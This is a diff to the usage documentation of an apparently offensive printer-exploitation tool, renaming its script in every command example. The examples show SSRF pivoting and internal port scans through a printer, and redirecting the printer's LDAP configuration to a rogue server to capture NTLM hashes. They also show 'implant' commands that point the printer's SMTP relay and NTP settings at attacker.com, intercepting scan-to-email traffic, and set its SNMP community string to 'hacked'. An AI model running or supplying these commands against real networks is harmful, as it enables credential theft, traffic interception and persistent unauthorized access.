@@ -10,12 +10,12 @@ The `--pivot` flag detects SSRF vectors by sending IPP and WSD print requests po
 
 ```bash
 # Detect SSRF vectors and enumerate reachable internal hosts
-python printerxpl-forge.py 192.168.1.100 --pivot
+python pxf.py 192.168.1.100 --pivot
 
 # Port-scan a specific internal host via printer SSRF
-python printerxpl-forge.py 192.168.1.100 --pivot-scan 10.0.0.1
-python printerxpl-forge.py 192.168.1.100 --pivot-scan 192.168.1.1
-python printerxpl-forge.py 192.168.1.100 --pivot-scan 172.16.0.10
+python pxf.py 192.168.1.100 --pivot-scan 10.0.0.1
+python pxf.py 192.168.1.100 --pivot-scan 192.168.1.1
+python pxf.py 192.168.1.100 --pivot-scan 172.16.0.10
 ```
 
 **How it works:**
@@ -47,7 +47,7 @@ python printerxpl-forge.py 192.168.1.100 --pivot-scan 172.16.0.10
 Build a complete map of the network from the printer's vantage point.
 
 ```bash
-python printerxpl-forge.py 192.168.1.100 --network-map
+python pxf.py 192.168.1.100 --network-map
 ```
 
 **Data sources used:**
@@ -109,7 +109,7 @@ Many enterprise printers are configured to authenticate against Active Directory
 
 ```bash
 # Step 1 — Check if printer has LDAP integration configured
-python printerxpl-forge.py 192.168.1.100 --xpl-check research-ldap-hash-capture
+python pxf.py 192.168.1.100 --xpl-check research-ldap-hash-capture
 
 # Output (if vulnerable):
 # [+] VULNERABLE: LDAP server configured at ldap.company.internal
@@ -121,10 +121,10 @@ python printerxpl-forge.py 192.168.1.100 --xpl-check research-ldap-hash-capture
 # (listens on port 389 for LDAP, captures NTLM hashes)
 
 # Step 3 — Redirect printer's LDAP config to attacker IP (dry-run shows payload)
-python printerxpl-forge.py 192.168.1.100 --xpl-run research-ldap-hash-capture
+python pxf.py 192.168.1.100 --xpl-run research-ldap-hash-capture
 
 # Step 4 — Live: redirect to rogue LDAP server
-python printerxpl-forge.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
+python pxf.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
 # (prompts for rogue server IP)
 
 # Step 5 — When the printer next triggers an LDAP lookup (scan job, address book):
@@ -144,16 +144,16 @@ Change printer's server configuration to persist access or redirect traffic:
 
 ```bash
 # Change SMTP relay (intercept all scan-to-email traffic)
-python printerxpl-forge.py 192.168.1.100 --implant smtp_host=attacker.com
+python pxf.py 192.168.1.100 --implant smtp_host=attacker.com
 
 # Change DNS server
-python printerxpl-forge.py 192.168.1.100 --implant dns=8.8.8.8
+python pxf.py 192.168.1.100 --implant dns=8.8.8.8
 
 # Change SNMP community string
-python printerxpl-forge.py 192.168.1.100 --implant snmp_community=hacked
+python pxf.py 192.168.1.100 --implant snmp_community=hacked
 
 # Change NTP server (time-based attacks)
-python printerxpl-forge.py 192.168.1.100 --implant ntp=attacker.com
+python pxf.py 192.168.1.100 --implant ntp=attacker.com
 ```
 
 ---
